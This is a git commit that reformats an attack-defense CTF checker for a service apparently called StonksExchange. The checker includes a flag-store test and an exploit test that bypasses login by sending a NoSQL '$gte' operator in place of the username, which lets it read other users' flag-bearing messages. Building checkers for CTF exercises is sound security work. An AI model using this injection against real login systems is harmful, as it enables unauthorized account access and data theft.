8b42ec7a31bdcb1678f0c6dfb99ea508a520ff79
Lucas Druschke <ldruschk@posteo.de>
2021-06-28 18:25:19 +0200

    fix lints

--- checker/checker.py
+++ checker/checker.py
@@ -1,54 +1,31 @@
-from typing import Optional
-from enochecker3 import (
-    Enochecker,
-    ChainDB,
-    GetflagCheckerTaskMessage,
-    MumbleException,
-    PutflagCheckerTaskMessage,
-)
-from enochecker3.utils import FlagSearcher, assert_equals, assert_in
-from httpx import AsyncClient
 import secrets
 from logging import LoggerAdapter
+from typing import Optional, Tuple
+
+from enochecker3 import ChainDB, Enochecker, GetflagCheckerTaskMessage, MumbleException, PutflagCheckerTaskMessage
+from enochecker3.utils import FlagSearcher, assert_equals, assert_in
+from httpx import AsyncClient
 
 checker = Enochecker("StonksExchange", 8199)
 app = lambda: checker.app
 
 
-async def register_user(client: AsyncClient):
+async def register_user(client: AsyncClient) -> Tuple[str, str]:
     username = secrets.token_hex(6)
     password = secrets.token_hex(8)
-    response = await client.post(
-        "/register",
-        data={
-            "username": username,
-            "password": password,
-        },
-    )
+    response = await client.post("/register", data={"username": username, "password": password,},)
     assert_equals(response.status_code, 200, "registration failed")
 
     return username, password
 
 
 async def login_user(client: AsyncClient, username: str, password: str) -> None:
-    response = await client.post(
-        "/login",
-        data={
-            "username": username,
-            "password": password,
-        },
-    )
+    response = await client.post("/login", data={"username": username, "password": password,},)
     assert_equals(response.status_code, 200, "login failed")
 
 
 async def send_message(client: AsyncClient, username: str, message: str) -> None:
-    response = await client.post(
-        "/message",
-        data={
-            "username": username,
-            "message": message,
-        },
-    )
+    response = await client.post("/message", data={"username": username, "message": message,},)
     assert_equals(response.status_code, 200, "sending message failed")
 
 
@@ -59,13 +36,7 @@ async def receive_message(client: AsyncClient, message: str) -> None:
 
 
 @checker.putflag(0)
-async def putflag_test(
-    task: PutflagCheckerTaskMessage,
-    session_a: AsyncClient,
-    session_b: AsyncClient,
-    db: ChainDB,
-    logger: LoggerAdapter,
-) -> None:
+async def putflag_test(task: PutflagCheckerTaskMessage, session_a: AsyncClient, session_b: AsyncClient, db: ChainDB, logger: LoggerAdapter,) -> None:
     await register_user(session_a)
     logger.debug("registered user for session_a")
     (username_b, password_b) = await register_user(session_b)
@@ -77,9 +48,7 @@ async def putflag_test(
 
 
 @checker.getflag(0)
-async def getflag_test(
-    task: GetflagCheckerTaskMessage, session_b: AsyncClient, db: ChainDB
-) -> None:
+async def getflag_test(task: GetflagCheckerTaskMessage, session_b: AsyncClient, db: ChainDB) -> None:
     try:
         username, password = await db.get("credentials")
     except KeyError:
@@ -94,30 +63,19 @@ async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[
     username = "0" * 12 + secrets.token_hex(6)
     password = secrets.token_hex(8)
 
-    r = await client.post(
-        "/register",
-        data={
-            "username": username,
-            "password": password,
-        },
-    )
+    r = await client.post("/register", data={"username": username, "password": password,},)
     assert not r.is_error
 
-    r = await client.post(
-        "/login",
-        json={
-            "username": {
-                "$gte": username,
-            },
-            "password": password,
-        },
-    )
+    r = await client.post("/login", json={"username": {"$gte": username,}, "password": password,},)
     assert not r.is_error
 
     r = await client.get("/messages")
     assert not r.is_error
     if flag := searcher.search_flag(r.text):
         return flag
+
+    raise MumbleException("exploit failed")
+
 
 if __name__ == "__main__":
     checker.run()
